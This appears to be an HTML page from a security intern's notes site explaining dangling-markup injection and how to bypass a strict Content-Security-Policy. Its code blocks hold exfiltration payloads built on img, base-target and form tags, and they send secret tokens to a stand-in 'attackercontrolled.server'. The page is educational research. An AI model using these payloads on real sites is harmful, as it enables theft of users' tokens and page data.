@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>Evading CSP with DOM-based dangling markup (PortSwigger) - An alternative approach - Internship Ramblings</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Evading CSP with DOM-based dangling markup (PortSwigger) - An alternative approach";
+        var mkdocs_page_input_path = "research/dangling markup.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <script src="../../js/jquery-3.6.0.min.js" defer></script>
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+      <script>hljs.initHighlightingOnLoad();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> Internship Ramblings
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Home</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">OWASP</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../OWASP/api/">Api</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">SAML</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../SAML/saml_notes/">SAML</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Audits</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../audits/PoC/">Coverflex</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../audits/neurowave/">NEUROWAVE, LDA</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Ctfs</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="#">Capital ctf</a>
+    <ul>
+                <li class="toctree-l2"><a class="reference internal" href="../../ctfs/capital-ctf/">Index</a>
+                </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="#">Dvga</a>
+    <ul>
+                <li class="toctree-l2"><a class="reference internal" href="../../ctfs/dvga/dvga/">Dvga</a>
+                </li>
+    </ul>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Dvwss</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dvwss/notes/">Notes</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Goatlin</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../goatlin/notes/">Goatlin Notes</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Notes</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../notes/api_types/">Api types</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../notes/http2/">Http2</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../notes/nosqli/">NoSQL</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../notes/sql/">SQL - Structured Query Language</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Portswigger</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../portswigger/labs/">PortSwigger labs</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Quiz</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../quiz/SecurityChampion/">QUIZ</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Research</span></p>
+              <ul class="current">
+                  <li class="toctree-l1"><a class="reference internal" href="../angular_notes/">Angular</a>
+                  </li>
+                  <li class="toctree-l1 current"><a class="reference internal current" href="./">Evading CSP with DOM-based dangling markup (PortSwigger) - An alternative approach</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#what-is-dangling-markup">What is dangling markup?</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#portswigger-research">Portswigger Research</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#if-form-is-allowed-exifiltrating-without-correct-markup-without-javascript-and-bypassing-csp">If form is allowed - exifiltrating without correct markup, without javascript and bypassing CSP.</a>
+    </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="#">Subdomain takeover</a>
+    <ul>
+                <li class="toctree-l2"><a class="reference internal" href="../subdomain-takeover/">Index</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="#">Findings</a>
+    <ul>
+                <li class="toctree-l3"><a class="reference internal" href="../subdomain-takeover/findings/security-advisory/">Security Advisory</a>
+                </li>
+    </ul>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="#">Src</a>
+    <ul>
+                <li class="toctree-l3"><a class="reference internal" href="#">Commands</a>
+    <ul>
+                <li class="toctree-l4"><a class="reference internal" href="../subdomain-takeover/src/commands/commands/">Commands</a>
+                </li>
+    </ul>
+                </li>
+                <li class="toctree-l3"><a class="reference internal" href="#">Script</a>
+    <ul>
+                <li class="toctree-l4"><a class="reference internal" href="../subdomain-takeover/src/script/">Index</a>
+                </li>
+    </ul>
+                </li>
+    </ul>
+                </li>
+    </ul>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Techniques</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../techniques/interesting/">Techniques created by me (or not) uncommon in the wild</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../techniques/methodology/">A methodological checklist to logically deduce the steps needed to pentest a web app.</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../techniques/triggers/">Errors based/behaviour inferer</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Tools</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../tools/notes/">Notes</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">Internship Ramblings</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" alt="Docs"></a> &raquo;</li>
+          <li>Research &raquo;</li>
+      <li>Evading CSP with DOM-based dangling markup (PortSwigger) - An alternative approach</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="evading-csp-with-dom-based-dangling-markup-portswigger-an-alternative-approach">Evading CSP with DOM-based dangling markup (PortSwigger) - An alternative approach</h1>
+<h2 id="what-is-dangling-markup">What is dangling markup?</h2>
+<p>It is a technique to steal a web page's given contents via resources that send that data onto a remote attacker controlled location.</p>
+<p>If we have an injection point:</p>
+<pre><code>
+&lt;INJECTION POINT&gt; &lt;b&gt;test&lt;/b&gt;
+&lt;script&gt;
+token = 'yoursecrettoken';
+&lt;/script&gt;
+&lt;form action=&quot;blah&quot;&gt;&lt;/form&gt;
+
+</code></pre>
+<p>We can simply inject: <code>&lt;img src="https://attackercontrolled.server?</code> and the previous html becomes:</p>
+<pre><code>
+&lt;img src=&quot;https://attackercontrolled.server? &lt;b&gt;test&lt;/b&gt;
+&lt;script&gt;
+token = 'yoursecrettoken';
+&lt;/script&gt;
+&lt;form action=&quot;blah&quot;&gt;&lt;/form&gt;
+
+</code></pre>
+<p>As such, the data is sent as part of the query-string to the attacker controlled domain.</p>
+<h2 id="portswigger-research">Portswigger Research</h2>
+<p>This does not work with strict <code>CSP</code> such as: <code>default-src 'none'; base-uri 'none';</code>. The image will not load because no origin is allowed for that purpose. </p>
+<p>The amazing portswigger researcher Gareth Heyes discovered a technique to inject dangling markup even with these restrict directives:</p>
+<pre><code>
+&lt;a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html&gt;&lt;font size=100 color=red&gt;You must click me&lt;/font&gt;&lt;/a&gt;&lt;base target=&quot;blah&lt;b&gt;test&lt;/b&gt;
+
+&lt;script&gt;
+token = 'supersecret';
+&lt;/script&gt;
+
+&lt;form action=&quot;blah&quot;&gt;
+&lt;/form&gt;
+
+</code></pre>
+<p>By injecting an <code>&lt;a&gt;</code>and a <code>&lt;base&gt;</code> tag, we send data onto an attacker controlled server: If the <code>target</code> attribute is not one of any predefined values, it will set <code>window.name</code> of the new window to the value it has. This means we can inject a dangling markup, and exfiltrate the data in the attacker controlled server like this:</p>
+<p><code>&lt;script&gt;alert("The extracted content is:" + name);&lt;/script&gt;</code></p>
+<h2 id="if-form-is-allowed-exifiltrating-without-correct-markup-without-javascript-and-bypassing-csp">If form is allowed - exifiltrating without correct markup, without javascript and bypassing CSP.</h2>
+<p>If the tag <code>&lt;form&gt;</code> is allowed, an attacker can exfiltrate information with a dangling markup by taking advantage of <code>action</code> and <code>value</code> attributes of <code>&lt;form&gt;</code> and <code>&lt;input&gt;</code>respectively. This technique  does not require correct markup below your injection point, bypasses CSP and does not use javascript on another page to exfiltrate what was read.</p>
+<pre><code>
+&lt;?php
+
+header(&quot;Content-Security-Policy: base-uri 'none'; default-src 'none';&quot;);
+
+?&gt;
+
+
+&lt;!DOCTYPE HTML&gt;
+&lt;html&gt;
+&lt;form action=&quot;http://attackercontrolled.server&quot; method=&quot;GET&quot;&gt;
+    &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;
+    &lt;input hidden type=&quot;text&quot; name=&quot;id&quot; value=&quot;
+&lt;script&gt;
+    token = 'supersecret';
+&lt;/script&gt;
+&lt;/form&gt;&quot;
+
+&lt;/html&gt;
+
+
+</code></pre>
+<p>This works because before a form is sent the browser collects each <code>value</code> attribute in each <code>&lt;input&gt;</code> tag. When the form is sent by cliking the submit button, those values are sent with it to the url at the attacker controlled server. The attacker receives that data via the id query-string.</p>
+<p><img alt="" src="../Images/dang-form.png" /></p>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../angular_notes/" class="btn btn-neutral float-left" title="Angular"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../subdomain-takeover/" class="btn btn-neutral float-right" title="Index">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../angular_notes/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../subdomain-takeover/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script>var base_url = '../..';</script>
+    <script src="../../js/theme_extra.js" defer></script>
+    <script src="../../js/theme.js" defer></script>
+      <script src="../../search/main.js" defer></script>
+    <script defer>
+        window.onload = function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        };
+    </script>
+
+</body>
+</html>
